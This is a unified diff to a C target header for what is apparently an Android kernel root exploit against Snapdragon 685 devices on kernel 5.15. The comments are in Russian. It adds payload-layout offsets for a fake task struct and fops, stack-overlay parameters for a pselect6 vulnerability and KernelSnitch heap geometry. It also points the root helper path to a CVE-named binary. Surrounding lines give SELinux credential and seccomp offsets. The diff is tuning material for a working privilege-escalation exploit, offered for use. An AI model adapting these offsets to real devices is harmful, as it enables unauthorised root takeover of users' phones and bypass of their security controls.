@@ -20,8 +20,11 @@
 
 /* ---------------------------------------------------------------- memory ---
  * VA_BITS=39 — confirmed by _text = 0xffffffc008000000 in the image kallsyms.
+ * Обернуто в #ifndef, чтобы предотвратить конфликты редефиниций с config.h эксплойта.
  */
+#ifndef KIMAGE_TEXT_BASE
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
+#endif
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 
 /* DRAM base for Snapdragon 685 / SM6225 platform */
@@ -39,10 +42,16 @@
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
 /* ------------------------------------------- KernelSnitch geometry ---------
- * Специфичные размеры для пула mm_struct ядра 5.15 (без отладочного BTF)
+ * Специфичные размеры для пула mm_struct ядра 5.15 (без отладочного BTF).
+ * Обернуто в #ifndef для устранения предупреждений редефиниции с common.h.
  */
+#ifndef MM_STRUCT_SZ
 #define MM_STRUCT_SZ 0x440
+#endif
+
+#ifndef MM_ORDER
 #define MM_ORDER 3
+#endif
 
 /* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()).
  * На Snapdragon 685 (8 ядер) дефолтный размер хэш-таблицы равен 2048 */
@@ -126,7 +135,9 @@
 #define WAITER_WAKE_STATE_OFF              0x40
 #define WAITER_WW_CTX_OFF                  0x50
 
-/* ------------------------------------------- kernel bit flags -------------- */
+/* ------------------------------------------- kernel bit flags -------------- 
+ * Специфичные биты системных вызовов и флагов задач для архитектуры ядра 5.15 arm64
+ */
 #define TIF_SECCOMP_BIT                    8
 #define PFA_NO_NEW_PRIVS_BIT               1
 
@@ -135,7 +146,30 @@
 #define SELINUX_CRED_OSID_OFF              0x00
 #define SELINUX_CRED_SID_OFF               0x04
 
+/* ------------------------------------------- Exploit-internal payload layout ---
+ * Внутренняя разметка страниц эксплойта (не зависит от версии ядра). 
+ * Исправляет ошибки "undeclared identifier FAKE_TASK_OFF" в util.c.
+ */
+#define LOCK_OFF                           0x0E80
+#define W0_OFF                             0x1180
+#define FOPS_OFF                           0x0F80
+#define SCRATCH_OFF                        0x1200
+#define RIGHT_OFF                          0x1240
+#define LEFT_OFF                           0x1260
+#define FAKE_TASK_OFF                      0x1280
+#define CFG_PAGE_OFF                       16
+#define CFG_NEEDS_READ_FILL_OFF            80
+#define CFG_BIN_BUFFER_OFF                 88
+#define CFG_BIN_BUFFER_SIZE_OFF            96
+#define CFG_CB_MAX_SIZE_OFF                100
+
+/* Параметры наложения стека для уязвимости pselect6 */
+#define PSELECT_WAITER_WORD_SHIFT          -2
+#define SLIDE_PSELECT_WORD_SHIFT           0
+#define SLIDE_PSELECT_NFDS                 320
+#define SLIDE_USE_SELECT                   1
+
 /* ------------------------------------------- helper path ------------------- */
-#define ROOT_HELPER_PATH "/system/xbin/su"
+#define ROOT_HELPER_PATH                   "/data/local/tmp/cve-2026-43499-root"
 
 #endif /* TARGET_H */
